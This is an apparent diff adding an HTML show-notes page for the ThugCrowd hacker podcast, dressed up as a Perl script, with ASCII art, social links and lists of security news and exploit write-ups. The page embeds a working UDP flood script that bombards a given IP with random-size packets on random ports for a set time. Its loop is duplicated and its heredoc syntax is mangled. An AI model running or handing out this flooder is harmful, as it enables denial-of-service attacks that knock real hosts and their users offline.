@@ -1,0 +1,173 @@
+<html>
+<head>
+    <title>20190205.pl</title>
+    <meta charset="cp-437">
+    <link rel="stylesheet" href="../public/css/ir-black.min.css">
+    <style>
+      @font-face {
+           font-family:"TopazPlus a600a1200a4000";
+           src: url(../public/fonts/topazplus120010.ttf);
+           /*font-family:"BigBlue Terminal Plus";
+           src: url(fonts/BigBlue_TerminalPlus.TTF);*/
+      }
+      body {
+         color: white;
+         /*background-color: #0d0d18;*/
+         background-color: black;
+      }
+      pre {
+        font-family:"TopazPlus a600a1200a4000", "Lucida Console", monospace, Monaco;
+      }
+      a {
+        color: #fff58e;
+        text-decoration: none;
+      }
+      iky { color: #74ee15; }
+      y   { color: #f0c674; }
+      gr  { color: #aff981; }
+      r   { color: #f22e2e; }
+      w   { color: #ffffff; }
+      pnk { color: #f4b6e5; }
+      bb  { color: #9df2f2; }
+      prp { color: #daa3ff; }
+      l   { color: #c5c8c6; }
+      lg  { color: #9de9a9; }
+      stk { color: #c45100; }
+      gry { color: #a5b2b7; }
+      gx0 { color: #686868; }
+      gx1 { color: #696969; }
+      gx2 { color: #707070; }
+      gx3 { color: #787878; }
+      gx4 { color: #808080; }
+      gx5 { color: #888888; }
+      gx6 { color: #909090; }
+      gx7 { color: #989898; }
+      gx8 { color: #A0A0A0; }
+      gx9 { color: #A8A8A8; }
+      gxA { color: #A9A9A9; }
+      gxB { color: #B0B0B0; }
+      gxC { color: #B8B8B8; }
+      gxD { color: #BEBEBE; }
+      gxE { color: #C0C0C0; }
+      gxF { color: #C8C8C8; }
+      .blinking{
+          animation:blinkingText 0.8s infinite;
+      }
+      @keyframes blinkingText{
+          0%   { color: #c45100; }
+          50%  { color: transparent; }
+          100% { color: #c45100; }
+      }
+
+  </style>
+</head>
+<body class="hack dark"><center>
+<div style="display: inline-block; text-align: left;"><pre><code class="perl">#!/usr/bin/perl
+
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV;
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print << EOTEXT; """
+     ______________     ______      ___                
+     \   _    _   /----/     /_____/   \________       
+     /___/    /___\  _/     //    /    /   _    \      
+        /    //      \     //    /    /    /    /      
+       /_____\       /_____\ _________\_____   /       
+              \_____/       \/     \___________\       
+  _________  ___________ ________ _______   _________  
+_/        /_ )   ._    //  __    X      /___\______  \ 
+\     |__/  \_   |/  _/     /   //     /      /   /   >
+ \    |       /  /    \_   /    /_    /\     /   /   / 
+  \__________/   \      /______/ /____/\___  X      /  
+            \___/ \____/                   \/ \____/   
+
+              greetz 2 the whole crew! 
+
+    <a href="https://twitch.tv/hardchat">TWITCH</a> | <a href="https://twitter.com/thugcrowd">TWITTER</a> | <a href="https://patreon.com/thugcrowd">PATREON</a> | <a href="https://itunes.apple.com/us/podcast/thugcrowd/id1448045736?mt-2">iTUNES</a> | <a href="https://open.spotify.com/show/1q1UO8s05MiSTtKEEfzjP6?si=BSCugTiwS3qTtQ71KYYGnw">SPOTIFY</a> 
+           <a href="https://instagram.com/thugcrowd">INSTAGRAM</a> | <a href="snapchat://add/thugcrowd">SNAPCHAT</a> | <a href="http://vm.tiktok.com/J3Dfk8/">TIKTOK</a>
+
+TONiGHT: Talking DDoS, Packets, && Hacks with <a href="https://twitter.com/pwrcycle">@pwrcycle</a>
+
+"""
+EOTEXT
+
+print "~ThugCrowd just dropped yo shit: $ip " . ($port ? $port : "random") . " With " .
+($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
+($time ? "for $time seconds" : "") . "\n";
+
+for (;time() <= $endtime;) {
+$psize = $size ? $size : int(rand(1024-64)+64) ;
+$pport = $port ? $port : int(rand(65500))+1;
+
+send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
+$iaddr));}for (;time() <= $endtime;) {
+$psize = $size ? $size : int(rand(1024-64)+64) ;
+$pport = $port ? $port : int(rand(65500))+1;
+
+send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
+$iaddr));}
+
+print << EOTEXT;
+
+### NEWS #########################################################################
+
+<a href="https://www.theverge.com/platform/amp/2019/2/5/18211766/google-password-checkup-chrome-extension-data-breach-login-credentials">"Google's new Chrome Extension automatically checks if your passwords are secure"</a>
+
+<a href="https://www.slashgear.com/google-play-store-apps-with-over-4m-downloads-found-with-malware-phishing-scams-02564459/amp/">"Google Play Store apps with over 4M downloads found with malware, phishing scams"</a>
+
+<a href="https://nakedsecurity.sophos.com/2019/02/01/hacker-talks-to-baby-through-nest-security-cam-jacks-up-thermostat/amp/">"Hacker talks to baby through Nest security cam, jacks up thermostat"</a>
+
+<a href="https://thehackernews.com/2019/02/remote-desktop-hacking.html">"Flaws in Popular RDP Clients Allow Malicious Servers to Reverse Hack PCs"</a>
+
+<a href="https://www.bleepingcomputer.com/news/security/new-speakup-backdoor-infects-linux-and-macos-with-miners/">"New SpeakUp Backdoor Infects Linux and macOS with Miners"</a>
+
+<a href="https://www.zdnet.com/google-amp/article/two-hacker-groups-responsible-for-60-percent-of-all-publicly-reported-hacks/">"Two hacker groups responsible for 60 percent of all publicly reported hacks"</a>
+
+<a href="https://motherboard.vice.com/en_us/article/gyaqnb/hacker-joel-ortiz-sim-swapping-10-years-in-prison">"Hacker Who Stole $5 Million By SIM Swapping Gets 10 Years in Prison"</a>
+
+<a href="https://www.forbes.com/sites/thomasbrewster/2019/01/29/discord-the-2-billion-gamers-paradise-coming-to-terms-with-data-thieves-child-groomers-and-fbi-investigators/#6c57b59a3741">"Discord: Coming To Terms With Data Thieves, Child Groomers And FBI Investigators"</a>
+
+<a href="https://www.secjuice.com/security-researcher-assaulted-ice-atrient/">"Researcher Assaulted By A Vendor After Disclosing A Vulnerability"</a>
+
+### LOL OF THE WEEK ##############################################################
+
+<a href="https://www.theinquirer.net/inquirer/news/3070400/nsa-branded-webcam-covers-are-see-through">"NSA branded webcam covers are see-through"</a>
+
+### GOOD READS ###################################################################
+
+<a href="https://googleprojectzero.blogspot.com/2019/02/the-curious-case-of-convexity-confusion.html">"Project Zero: The Curious Case of Convexity Confusion"</a>
+
+<a href="https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/">"Exploiting SSRF in AWS Elastic Beanstalk"</a>
+
+<a href="https://chigstuff.com/blog/metasploit-domain-fronting-with-microsoft-azure/">"Metasploit Domain Fronting With Microsoft Azure"</a>
+
+<a href="https://capsule8.com/blog/exploiting-systemd-journald-part-1/">"Exploiting systemd-journald Part 1"</a>
+
+<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">"iOS/macOS: task_swap_mach_voucher() does not respect MIG semantics leading to UAF"</a>
+
+<a href="https://www.npr.org/2019/02/05/691403968/charges-against-chinese-hackers-are-now-common-why-dont-they-deter-cyberattacks
+">"Charges Against Chinese Hackers Are Now Common. Why Don't They Deter Cyberattacks?"</a>
+
+### CHEAT CODES ##################################################################
+
+<a href="https://medium.com/@hakluke/interlace-a-productivity-tool-for-pentesters-and-bug-hunters-automate-and-multithread-your-d18c81371d3d">"Interlace: A Tool to Easily Automate and Multithread Your Pentesting & Bug Bounty</a>
+<a href="https://medium.com/@hakluke/interlace-a-productivity-tool-for-pentesters-and-bug-hunters-automate-and-multithread-your-d18c81371d3d">Workflow Without Any Coding"</a>
+
+<a href="https://soundcloud.com/thugcrowd/sets/20190205-mix">Playlist</a>
+
+EOTEXT
+
+</code></pre>
+</div>
+</center>
+<script src="../public/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
